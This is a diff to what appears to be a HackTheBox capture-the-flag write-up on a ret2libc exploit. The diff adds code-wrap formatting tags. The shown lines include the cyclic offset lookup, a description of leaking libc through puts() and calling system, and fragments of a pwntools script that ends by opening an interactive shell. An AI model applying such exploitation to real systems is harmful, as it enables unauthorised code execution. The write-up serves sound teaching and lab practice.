@@ -26,14 +26,17 @@ layout:
 
 Classic ret2libc attack. First, find the offset to RIP.
 
+{% code overflow="wrap" %}
 ```bash
 cyclic -l haaaaaaa
 Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)
 Found at offset 56
 ```
+{% endcode %}
 
 Next, leak lib-c foothold with `puts()` then redirect execution flow to the beginning of the `box` function and this time, ret2system.
 
+{% code overflow="wrap" %}
 ```python
 from pwn import *
 
@@ -126,5 +129,6 @@ io.sendlineafter(b':', payload)
 # Got Shell?
 io.interactive()
 ```
+{% endcode %}
 
 Flag: `HTB{r3turn_2_P4nd0r4?!}`
